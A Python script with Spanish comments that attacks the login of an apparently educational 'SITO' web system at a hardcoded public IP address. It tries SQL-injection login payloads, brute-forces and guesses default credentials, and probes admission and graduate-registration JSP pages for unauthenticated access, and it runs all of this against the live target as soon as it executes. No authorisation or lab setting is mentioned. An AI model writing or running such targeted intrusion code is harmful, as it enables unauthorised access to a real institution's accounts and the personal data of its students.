import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SitioLoginExploiter:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def analyze_login_form(self):
        """Analiza el formulario de login en profundidad"""
        print("[*] Analizando formulario de login SITO...")
        
        # Los parámetros del formulario son:
        # yAccion (hidden), yIntentos (hidden), yUsuario (hidden), xUsuario (text), xContrasena (password)
        
        try:
            # Primero obtener la página de login
            response = self.session.get(self.base_url, timeout=10)
            
            # Buscar el formulario y extraer valores hidden
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            form = soup.find('form')
            if form:
                hidden_values = {}
                for input_tag in form.find_all('input', {'type': 'hidden'}):
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    hidden_values[name] = value
                    print(f"[+] Hidden field: {name} = {value}")
                
                return hidden_values
                
        except Exception as e:
            print(f"[-] Error analizando formulario: {e}")
        
        return None

    def sql_injection_login(self):
        """Prueba SQL injection en el login"""
        print("\n[*] Probando SQL injection en login SITO...")
        
        # Payloads de SQL injection específicos para login
        sql_payloads = [
            ("admin' OR '1'='1'--", "anything"),
            ("admin' OR 1=1--", "test"),
            ("' OR '1'='1'--", "password"),
            ("admin'--", "test"),
            ("' OR 1=1--", "pass"),
            ("admin' /*", "test"),
            ("x' OR user_name != '", "y"),
            ("admin' UNION SELECT 1,2,3,4--", "test"),
            ("' OR 'a'='a", "pass"),
            ("admin' OR 'a'='a", "test")
        ]
        
        for username, password in sql_payloads:
            try:
                # Preparar datos del formulario
                login_data = {
                    'yAccion': 'login',  # Valor probable
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': username,
                    'xContrasena': password
                }
                
                response = self.session.post(f"{self.base_url}/jsp/login.jsp", 
                                           data=login_data, timeout=8)
                
                # Indicadores de éxito
                success_indicators = [
                    'Bienvenido', 'Welcome', 'Dashboard', 'Menú',
                    'location.href', 'window.location', 'redirect',
                    'Administración', 'Sistema', 'logout'
                ]
                
                failure_indicators = [
                    'Error', 'Invalid', 'Incorrecto', 'No existe',
                    'Denegado', 'Failed', 'SQL', 'Exception'
                ]
                
                if any(indicator in response.text for indicator in success_indicators):
                    print(f"[!] ¡POSIBLE SQL INJECTION EXITOSO!")
                    print(f"    Usuario: {username}")
                    print(f"    Contraseña: {password}")
                    print(f"    Response: {response.status_code}")
                    
                    # Guardar respuesta
                    with open('sql_injection_success.html', 'w', encoding='utf-8') as f:
                        f.write(response.text)
                    print("[+] Respuesta guardada en sql_injection_success.html")
                    
                elif any(indicator in response.text for indicator in failure_indicators):
                    print(f"[-] Falló: {username}")
                    
            except Exception as e:
                print(f"[-] Error probando {username}: {e}")

    def brute_force_sito_login(self):
        """Fuerza bruta específica para SITO"""
        print("\n[*] Fuerza bruta personalizada para SITO...")
        
        # Basado en el nombre "SITO - MISITIO"
        common_creds = [
            ("admin", "admin"),
            ("sito", "sito"),
            ("misitio", "misitio"),
            ("administrador", "administrador"),
            ("root", "root"),
            ("usuario", "usuario"),
            ("test", "test"),
            ("demo", "demo"),
            ("admin", "sito"),
            ("sito", "misitio"),
            ("admin", "misitio"),
            ("sito", "admin"),
            ("administrator", "administrator"),
            ("webmaster", "webmaster"),
            ("sysadmin", "sysadmin")
        ]
        
        for username, password in common_creds:
            try:
                login_data = {
                    'yAccion': 'login',
                    'yIntentos': '1',
                    'yUsuario': '',
                    'xUsuario': username,
                    'xContrasena': password
                }
                
                response = self.session.post(f"{self.base_url}/jsp/login.jsp", 
                                           data=login_data, timeout=5)
                
                if response.status_code == 200:
                    if 'error' not in response.text.lower() or 'invalid' not in response.text.lower():
                        print(f"[!] Respuesta interesante: {username}:{password}")
                        print(f"    Status: {response.status_code}")
                        
            except Exception as e:
                print(f"[-] Error: {e}")

    def test_default_passwords(self):
        """Prueba contraseñas por defecto comunes"""
        print("\n[*] Probando contraseñas por defecto...")
        
        default_passwords = [
            "admin", "password", "123456", "sito123", "misitio123",
            "admin123", "password123", "1234", "sito2024", "misitio2024",
            "Sito123", "Misitio123", "SITO", "MISITIO"
        ]
        
        usernames = ["admin", "sito", "misitio", "administrador", "usuario"]
        
        for username in usernames:
            for password in default_passwords:
                try:
                    login_data = {
                        'yAccion': 'login',
                        'yIntentos': '1',
                        'yUsuario': '',
                        'xUsuario': username,
                        'xContrasena': password
                    }
                    
                    response = self.session.post(f"{self.base_url}/jsp/login.jsp", 
                                               data=login_data, timeout=5)
                    
                    if 'Bienvenido' in response.text or 'Dashboard' in response.text:
                        print(f"[!] ¡CREDENCIALES VÁLIDAS ENCONTRADAS!")
                        print(f"    Usuario: {username}")
                        print(f"    Contraseña: {password}")
                        return username, password
                        
                except Exception as e:
                    pass

    def exploit_jsp_paths(self):
        """Explota las rutas JSP encontradas"""
        print("\n[*] Explotando rutas JSP específicas...")
        
        jsp_paths = [
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D",
            "/jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z",
            "/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp",
            "/jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1"
        ]
        
        for path in jsp_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] JSP accesible: {path}")
                    
                    # Buscar parámetros interesantes
                    if '?' in path:
                        param = path.split('?')[1]
                        print(f"    Parámetro: {param}")
                        
                    # Verificar si requiere autenticación
                    if 'login' in response.text.lower() or 'acceso' in response.text.lower():
                        print("    [!] Posiblemente requiere login")
                    else:
                        print("    [+] Posiblemente accesible sin login")
                        
            except Exception as e:
                print(f"[-] Error en {path}: {e}")

# Ejecutar explotación SITO
sito_exploiter = SitioLoginExploiter("189.254.143.102")
sito_exploiter.analyze_login_form()
sito_exploiter.sql_injection_login()
sito_exploiter.brute_force_sito_login()
sito_exploiter.test_default_passwords()
sito_exploiter.exploit_jsp_paths()